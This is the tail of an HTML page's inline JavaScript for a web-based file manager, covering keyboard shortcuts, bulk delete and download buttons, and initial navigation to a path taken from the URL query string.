  if(e.key==='F5'){e.preventDefault();navigate(S.path)}
  if(e.ctrlKey&&e.key==='s'&&$('#mEditor').classList.contains('open')){e.preventDefault();saveEditor()}
  if(e.key==='Escape'){
    if (sidebar.classList.contains('open')) closeSidebar();
    if (S.selected.size) clearSelection();
    closeAll();
  }
});

const _bulkDelBtn = $('#bulkDel');
if(_bulkDelBtn) _bulkDelBtn.onclick = deleteSelected;
const _bulkDlBtn = $('#bulkDl');
if(_bulkDlBtn) _bulkDlBtn.onclick = bulkDownload;
const _bulkCloseBtn = $('#bulkClose');
if(_bulkCloseBtn) _bulkCloseBtn.onclick = clearSelection;

// ─── Init ─────────────────────────────────────────────────────────
const initPath = new URLSearchParams(location.search).get('path') || '';
if (initPath) {
    navigate(initPath);
} else {
    // Jika tidak ada path, set S.path ke BASE atau biarkan kosong
    // Tapi breadcrumb akan menampilkan baseDirName
    S.path = '';
    renderBreadcrumb();
    // Load files from BASE
    navigate('');
}

loadInfo();
loadDrives();
navigate(initPath);
</script>
</body>
</html>
